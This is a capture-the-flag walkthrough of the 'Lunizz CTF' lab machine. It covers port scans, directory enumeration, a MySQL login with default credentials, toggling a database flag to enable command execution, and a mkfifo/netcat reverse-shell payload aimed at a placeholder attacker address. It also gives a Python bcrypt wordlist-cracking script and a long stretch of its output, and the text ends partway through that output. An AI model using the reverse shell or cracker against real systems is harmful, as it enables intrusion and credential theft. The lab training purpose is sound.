# Lunizz CTF

nmap scan :

```jsx
# Nmap 7.98 scan initiated Sat Jan 31 21:42:37 2026 as: /usr/lib/nmap/nmap -sV -sC -oA nmap_scan.txt 10.49.137.110
Nmap scan report for 10.49.137.110
Host is up (0.080s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b9:76:7d:ec:3b:8e:0d:01:27:bb:af:83:25:7a:aa:7a (RSA)
|   256 d0:4a:fa:20:02:ac:3c:ed:bb:6b:1d:7f:43:82:0a:e1 (ECDSA)
|_  256 1d:c7:bb:15:b9:fc:37:ef:65:99:8e:00:5a:cf:dc:95 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.20.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SwitchToSSLAfterHandshake, LongPassword, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, Support41Auth, InteractiveClient, FoundRows, SupportsTransactions, DontAllowDatabaseTableColumn, ODBCClient, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, ConnectWithDatabase, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x02\x07	x\x02q\x17Kq<a%B\x17YWHYe\x0C
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-02-11T23:12:30
|_Not valid after:  2031-02-09T23:12:30
|_ssl-date: TLS randomness does not represent time
4444/tcp open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     cEBzc3dvcmQ=
|     Wrong Password
|   NULL: 
|     Can you decode this for me?
|     cEBzc3dvcmQ=
|   SSLSessionReq: 
|     Can you decode this for me?
|_    cmFuZG9tcGFzc3dvcmQ=
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, ZendJavaBridge: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4444-TCP:V=7.98%I=7%D=1/31%Time=697E2A00%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"Can\x20you\x20decode\x20this\x20for\x20me\?\ncEBzc3dvcmQ=\n")%r(
SF:GetRequest,37,"Can\x20you\x20decode\x20this\x20for\x20me\?\ncEBzc3dvcmQ
SF:=\nWrong\x20Password")%r(SSLSessionReq,31,"Can\x20you\x20decode\x20this
SF:\x20for\x20me\?\ncmFuZG9tcGFzc3dvcmQ=\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.98%I=7%D=1/31%Time=697E29FA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\
SF:x20/usr/local/ssl/openssl\.cnf")%r(GetRequest,46,"OpenSSH\x205\.1\nUnab
SF:le\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.c
SF:nf")%r(RTSPRequest,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\
SF:x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(DNSVersionBindReqTCP
SF:,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x2
SF:0/usr/local/ssl/openssl\.cnf")%r(SMBProgNeg,46,"OpenSSH\x205\.1\nUnable
SF:\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf
SF:")%r(ZendJavaBridge,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config
SF:\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(HTTPOptions,46,"Ope
SF:nSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/lo
SF:cal/ssl/openssl\.cnf")%r(RPCCheck,46,"OpenSSH\x205\.1\nUnable\x20to\x20
SF:load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(DNSSt
SF:atusRequestTCP,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20i
SF:nfo\x20from\x20/usr/local/ssl/openssl\.cnf")%r(Help,46,"OpenSSH\x205\.1
SF:\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/open
SF:ssl\.cnf")%r(SSLSessionReq,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x2
SF:0config\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(TerminalServ
SF:erCookie,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x2
SF:0from\x20/usr/local/ssl/openssl\.cnf")%r(TLSSessionReq,46,"OpenSSH\x205
SF:\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/o
SF:penssl\.cnf")%r(Kerberos,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20c
SF:onfig\x20info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(X11Probe,46,"O
SF:penSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/
SF:local/ssl/openssl\.cnf")%r(FourOhFourRequest,46,"OpenSSH\x205\.1\nUnabl
SF:e\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cn
SF:f")%r(LPDString,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20
SF:info\x20from\x20/usr/local/ssl/openssl\.cnf")%r(LDAPSearchReq,46,"OpenS
SF:SH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\x20/usr/loca
SF:l/ssl/openssl\.cnf");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 31 21:42:59 2026 -- 1 IP address (1 host up) scanned in 21.94 seconds
```

Feroxbuster :

```jsx
200      GET       15l       74w     6147c http://10.49.137.110/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.49.137.110/
200      GET       13l       46w      339c http://10.49.137.110/instructions.txt
301      GET        9l       28w      315c http://10.49.137.110/hidden => http://10.49.137.110/hidden/
301      GET        9l       28w      323c http://10.49.137.110/hidden/uploads => http://10.49.137.110/hidden/uploads/
301      GET        9l       28w      317c http://10.49.137.110/whatever => http://10.49.137.110/whatever/
```

from nmap scan :

```jsx
|     Can you decode this for me?
|     cEBzc3dvcmQ=
|     Wrong Password
|   NULL: 
|     Can you decode this for me?
|     cEBzc3dvcmQ=
|   SSLSessionReq: 
|     Can you decode this for me?
|_    cmFuZG9tcGFzc3dvcmQ=
```

from base64 : (no use just to derail)

```jsx
cEBzc3dvcmQ= --> p@ssword
cmFuZG9tcGFzc3dvcmQ= --> randompassword
```

Website :

1. [http://10.49.137.110/](http://10.49.137.110/)

![image.png](image.png)

1. [http://10.49.137.110/instructions.txt](http://10.49.137.110/instructions.txt)

![image.png](image%201.png)

1. [http://10.49.137.110/hidden/](http://10.49.137.110/hidden/) (no use just to derail)

![image.png](image%202.png)

1. [http://10.49.137.110/whatever/](http://10.49.137.110/whatever/)

![image.png](image%203.png)

we are not able to run commands until the value of the command executer mode changed to 1

Mysql :

connecting to mysql server :

using credentials we found from [http://10.49.137.110/instructions.txt](http://10.49.137.110/instructions.txt) :

```jsx
runcheck:CTF_script_cave_changeme
```

Q1:What is the default password for mysql

Answer : CTF_script_cave_changeme

we login in :

```jsx
┌──(root💀akhilbangaru)-[/home/akhilbangaru/THM/Lunizz-CTF]
└─# mysql -h 10.49.137.110 -u runcheck -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 23
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

enumerating mysql :

```jsx
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| runornot           |
+--------------------+
3 rows in set (0.150 sec)

MySQL [(none)]> use runornot
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.107 sec)

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
1 row in set (0.120 sec)
```

changing the value of run to 1:

```jsx
MySQL [runornot]> update runcheck set run=1;
Query OK, 1 row affected (0.138 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Q2.I can't run commands, there must be a mysql column that controls command executer

Answer : run

Now we can run commands :

![image.png](image%204.png)

we can see we are www-data

getting reverse shell :

payload :

```jsx
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker-ip port >/tmp/f
```

```jsx
┌──(akhilbangaru🤓akhilbangaru)-[~/THM/Lunizz-CTF]
└─$ nc -nlvp 1111
listening on [any] 1111 ...
connect to [192.168.161.236] from (UNKNOWN) [10.49.137.110] 46904
bash: cannot set terminal process group (868): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-49-137-110:/var/www/html/whatever$
```

Q3.a folder shouldn't be…

Answer : proct

```jsx
www-data@ip-10-49-137-110:/var/www/html/whatever$ cd /
cd /
www-data@ip-10-49-137-110:/$ ls
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
**proct**
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

going into proct directory :

```jsx
www-data@ip-10-49-137-110:/$ cd proct	
cd proct
www-data@ip-10-49-137-110:/proct$ ls
ls
pass
www-data@ip-10-49-137-110:/proct$ cd pass	
cd pass
www-data@ip-10-49-137-110:/proct/pass$ ls
ls
bcrypt_encryption.py
www-data@ip-10-49-137-110:/proct/pass$ cat bcrypt_encryption.py
cat bcrypt_encryption.py
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()
```

Cracking the hash : (had to see yt video for the cracking code since john and hashcat fails or takes so much time)

```jsx
import bcrypt
import base64

hashes = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
lt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.'

flag = False

with open(r"Path to rockyou", "r", encoding="latin-1") as f:
    for line in f.readlines():
        password = line.strip()
        passwd = password.encode('ascii')
        b64str = base64.b64encode(passwd)

        hashAndSalt = bcrypt.hashpw(b64str, b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.')

        print(f"Attempt to crack with password: {password}, its hash: {hashAndSalt}")

        if hashes == hashAndSalt:
            print(f"Found valid password: {password}")
            flag = True
            break

if not flag:
    print("Failed to crack password!!!!!")
```

Cracked password :

```jsx
┌──(root💀akhilbangaru)-[/home/akhilbangaru/THM/Lunizz-CTF]
└─# python3 cracker.py 
Attempt to crack with password: 123456, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.V/CbnWYcK8QXsyxHbDxIMvX0nznYBUS'
Attempt to crack with password: 12345, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.srZ4L8.3Po1zXLflu7EFP7Os9wTFEL6'
Attempt to crack with password: 123456789, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.2bdmqfkHMggqSNbMDudCz2GT0.DRPLy'
Attempt to crack with password: password, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.8vczWcLZfV2BVb0DmmTzqfzI/8XBwEq'
Attempt to crack with password: iloveyou, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.i43pVmIsA0IDsbIthi4Y04PLcFai812'
Attempt to crack with password: princess, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.f0s2aAHBIR03K51awblj3OwHYUQOAUC'
Attempt to crack with password: 1234567, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.JdUd.MeAQuq3VyMxfLMumCVIIb0tiei'
Attempt to crack with password: rockyou, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.RSqPKQmeOF.G.s9Fk.8lyW7Uwuo5PA6'
Attempt to crack with password: 12345678, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.5AVT.Rq5RTIf/pP.cRge37Th7a/HqrK'
Attempt to crack with password: abc123, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.HHStqcRUXQe1loP2DR3EVM/R6.At3Ny'
Attempt to crack with password: nicole, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.huOhZW/mrgGFG1eZCdaqTC7UWn9EsUG'
Attempt to crack with password: daniel, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.NtBi/OnN/f4lsjmfLpfRDNXgDBRTe4G'
Attempt to crack with password: babygirl, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.K/Z1vDZEG8VhvXCWAO70zISW41wjFLy'
Attempt to crack with password: monkey, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.9fcO.r54baooNBSWDut5YxSze42jSuO'
Attempt to crack with password: lovely, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.ESUYEIxZhvEYEbemgLMMYZth29oT9dm'
Attempt to crack with password: jessica, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.OaKvsQ6MkmtPTFmDYQVqmIkfg.CNM2W'
Attempt to crack with password: 654321, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.VB3T/.OnEvcZPUw3A28C2Kb1kU5fGV.'
Attempt to crack with password: michael, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.//SGy/CezIzez8S8WDpKfC8w1Aa4X12'
Attempt to crack with password: ashley, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.JC4cZ3FlgSCEndqNg7GrcmhxIkQTUh.'
Attempt to crack with password: qwerty, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Yy5UB5lA4PW0QYNCCDZOcY/RHRgaeim'
Attempt to crack with password: 111111, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3miRMbmCX0Y30VtwqVN93VZyj/QgJfu'
Attempt to crack with password: iloveu, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.SxV9rK9HQX0ImCImOKU1WMooKUm/cCm'
Attempt to crack with password: 000000, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Q1L5mpE0VQyVZpACrEtmt1CJHZo8e5G'
Attempt to crack with password: michelle, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.waBNNIxUdz/NaAJmXx6CTrnkslNhV/q'
Attempt to crack with password: tigger, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.dJLaLpgBazUbnkQoFtuTDCSs/FkBynq'
Attempt to crack with password: sunshine, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.M5Crz9DiwmIBLjFyPtXhi2Slu1mc/pa'
Attempt to crack with password: chocolate, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55..pijDAbRxc4PutywwybJS.2qkBGATEy'
Attempt to crack with password: password1, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.zQcrffExKgjR748RoruUoz1FJVLBfVa'
Attempt to crack with password: soccer, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.vVQnvuwS1U.7fgjDFBGGrWgI.520JI.'
Attempt to crack with password: anthony, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.1UdVibFTLD0H5Tvkhjd/Oke.hPiBNl6'
Attempt to crack with password: friends, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.2.PpHflNu6Neznr4j2prWUD01cce1NG'
Attempt to crack with password: butterfly, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.ka0.N/G8XExKIx7ViMJRpdklqhlBMDm'
Attempt to crack with password: purple, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.oGIEmmgGsiIufGpbKJ72xOO.t/lJdYS'
Attempt to crack with password: angel, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Dm/8IZkDFsxOnkq7FlBUohcccnu3j4y'
Attempt to crack with password: jordan, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.URsqQbF/U/XA362sf7yhl8F7lVaV/cy'
Attempt to crack with password: liverpool, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.okbg2y0szvL.mz3qvEHr9DMMD5/XHna'
Attempt to crack with password: justin, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.4OQBd8unhZ3nM8Kw2df8dfS9cPi2KLm'
Attempt to crack with password: loveme, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.7BXpLDn3J9CPjs93NbJWStqTaIa1wnm'
Attempt to crack with password: fuckyou, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.807z5R02Dwpaers1mLhRKGwK6a5VVKa'
Attempt to crack with password: 123123, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.ufGj3VCWLkS5zUqhr7OKepscPKoXEAe'
Attempt to crack with password: football, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Hmje81FR3.NE3JwS2N0ybEPRfJChYLa'
Attempt to crack with password: secret, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.zjVCpFkBsMsCc6pzWQJeZTN5LUCHGVW'
Attempt to crack with password: andrea, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55..WZYd30FPpZPMU8v8TmE0m2LKyHwxeG'
Attempt to crack with password: carlos, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.M3FAjEOEnpiQeUiBoZ5H7UxpahmzDFu'
Attempt to crack with password: jennifer, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.gTIFwepqPXUoMnzZvXrqe1KhZ07.5/q'
Attempt to crack with password: joshua, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.0oudzjzS32BI5yDke8JvcDlLkpBJoam'
Attempt to crack with password: bubbles, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Sc.VQTOupQ4r4TiDQW5vx.jahVtf3yy'
Attempt to crack with password: 1234567890, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.yWdKf/rkeooEM736Q7jKTgSflSadUhm'
Attempt to crack with password: superman, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.yFvuUW83RQxRtQyCAniiOJ48QhJ2YkO'
Attempt to crack with password: hannah, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Pli8cJQyXzUVSzE0sWG9abOuRomsWSO'
Attempt to crack with password: amanda, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.TBhudNqOUpC1kNNDoIn2ttKxGGl8OlO'
Attempt to crack with password: loveyou, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55./Pjz8xaXm0TohKx5TcxbfZ.v9mqoHmi'
Attempt to crack with password: pretty, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.XsuaEZPinXjzTPG6AJzgwpVYps2Z6Li'
Attempt to crack with password: basketball, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Kaou3jGX3SGoNtT16dtcBG7G63bx6Ku'
Attempt to crack with password: andrew, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.t1JMrzHNsUrqKNj6yqD5J5Q0STgL31G'
Attempt to crack with password: angels, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.kl.RbRmzcmBZ0hXaZsPN/uJRclQtwjS'
Attempt to crack with password: tweety, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.qhm6C640ZQuxDRQWLkxUa3VPQZj5HHu'
Attempt to crack with password: flower, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.XYqq7/kIme5GzlfcUqarBCZAadKRLIy'
Attempt to crack with password: playboy, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.hQxPxCZEMHDiMlqmldjPuP7SEyLIW9i'
Attempt to crack with password: hello, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55..LVOXcnV74TfJFhu8N3EpIh/e6n1J4i'
Attempt to crack with password: elizabeth, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.SxlKTLrE9aOCZA7CuMcJakS52c5EUH6'
Attempt to crack with password: hottie, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.8XbO5kejKAKGeOrDQOHvn4nH1VVpSJu'
Attempt to crack with password: tinkerbell, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.CYeO/DpbNccxQVqGiz7PHWsf/OI5iiS'
Attempt to crack with password: charlie, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.xAvtfQgEyAb9kEKoIjnp.lWvc6u8o1O'
Attempt to crack with password: samantha, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.U2wJdaDt7dPZ0g1A1h0IjUMjOx7x85a'
Attempt to crack with password: barbie, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.EQ2OWOp5i6yoM2Zk932ngIbPt2NLezi'
Attempt to crack with password: chelsea, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.xk0v5WJ.dRjluLl8bf6ZbH8/hJUdhpy'
Attempt to crack with password: lovers, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.vR7BCzUsYnLoRV/7Rsy1uXDlkgCp1fm'
Attempt to crack with password: teamo, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.Srd05X.SQFml41gIp0l.5Gsdlg82bha'
Attempt to crack with password: jasmine, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.LBbqe2wksNLhjN7H6uTDK3FcWmzb66K'
Attempt to crack with password: brandon, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.LBIy4mCAoJmcua85R9yGvaZQ4whAA/y'
Attempt to crack with password: 666666, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3NiqiiMsYTpSfz9b50T/H7i7RsvJddO'
Attempt to crack with password: shadow, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.mJ/QcZaDBxA8CSdFtr/JedKxb6xIXZu'
Attempt to crack with password: melissa, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.twyTbwS.eNXSuV6L2TlbNalX0ghZukO'
Attempt to crack with password: eminem, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.SihvC7CyTwOLxKQF0/o6.VbY7JhFHca'
Attempt to crack with password: matthew, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.IuUeMBOI2NjypOjchRHiMKV0eEBjuaK'
Attempt to crack with password: robert, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.T/fp/6uIdL2LajJM.pTedF4AzUwD.7G'
Attempt to crack with password: danielle, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.y/4m4zo53rw0VNAwoZlyOYnBEu71u0G'
Attempt to crack with password: forever, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.LZT5kowu/NJKzUxXnMo8Qup4wLtq0lG'
Attempt to crack with password: family, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.NTvTWrpFk4hbpVgzGn4i.TPcINuUkfW'
Attempt to crack with password: jonathan, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.30tRQ2m7VefqJbqfT3wmxCq0veWp5w6'
Attempt to crack with password: 987654321, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.RkL4y269P2UnRVIcPQmQ/ZmNU3VhYri'
Attempt to crack with password: computer, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.t.hx.G4Rwm7lIuVUeheI/2Let5fPLn.'
Attempt to crack with password: whatever, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.qUve63/DncYUyaHjpqoi1J5Pn/jdgeq'
Attempt to crack with password: dragon, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.fadR1faOv7qIvGxBdSty.v6xSQuvdua'
Attempt to crack with password: vanessa, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.lyBxEcvu4sA9reyBN41OgD9.gHXLsTS'
Attempt to crack with password: cookie, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.wfEOhNRDmf0iSEEYMh96vksoe3XXy86'
Attempt to crack with password: naruto, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55..wkPS2I/2ROvZqu2krk1gQKWT7nwCgW'
Attempt to crack with password: summer, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.goEHo87T6kkkQNY4ogU7Lc8t53EXUzW'
Attempt to crack with password: sweety, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.cA2UE9Ndvfzw9QriRHBedQFQEm52OUa'
Attempt to crack with password: spongebob, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.VLQOPl3iyNKcqfp/NIMFnO7nT/t4JKC'
Attempt to crack with password: joseph, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.dijnhYDPyxFpxIliJw6Z85xTY2yitJi'
Attempt to crack with password: junior, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9SjE1dZc4ll60uzZ95SZY2MMVzn4a'
Attempt to crack with password: softball, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.9CBH0LMPcTQe1R3B0snIGy6jy6zzg6u'
Attempt to crack with password: taylor, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.eH41iW2dMmSX4x8k80VkkTGpDgY/10C'
Attempt to crack with password: yellow, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.yV2VtsdtWZ3jGvKlXtMLD7W7cIK06j.'
Attempt to crack with password: daniela, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.aynMM9ghFvsU107Guqf0ydySCFhN6UO'
Attempt to crack with password: lauren, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.hDaMgCxD.t7MjN3GCs2y1fIvgdeY57O'
Attempt to crack with password: mickey, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.lh3vkvUo9FIFfaFhYDEmYPwRBSPCl0q'
Attempt to crack with password: princesa, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.hSp0jkH/fOMKDElmF6uUOOj/7r1zXpm'
Attempt to crack with password: alexandra, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.c9kgJaZ55zbrUIAKYeP2/0/WXJOWeN2'
Attempt to crack with password: alexis, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.KUAZ4n0L/v3ckOs5DDUUnioKB8LyWay'
Attempt to crack with password: jesus, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.pTUk0ENlaFf2sJmFpZ1OFg/pmPoGt8K'
Attempt to crack with password: estrella, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.v7hn1ERW1VZvLLsml.w/TTbeVTHgLq.'
Attempt to crack with password: miguel, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.fcv4j6u7mIoVcEDOxueh7PllB4/FQGG'
Attempt to crack with password: william, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.2wt5HyMYPkEWhkDGAfaERzNeTBz5mEq'
Attempt to crack with password: thomas, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.LpwTBod59tks6WgYubCJR6k8fgPZjTa'
Attempt to crack with password: beautiful, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.82clCbLzdRdekzmXlj0qqsHxTw1CXwS'
Attempt to crack with password: mylove, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.agUJavjXNiKYxgIwD.nA3tEr0R.6Zgy'
Attempt to crack with password: angela, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.cxyg7vPK9LOI.VQY.wPAmj20JPhuMGe'
Attempt to crack with password: poohbear, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.CMeZ7v3xFaotD4gWRMBkdLGrmv7kiQ6'
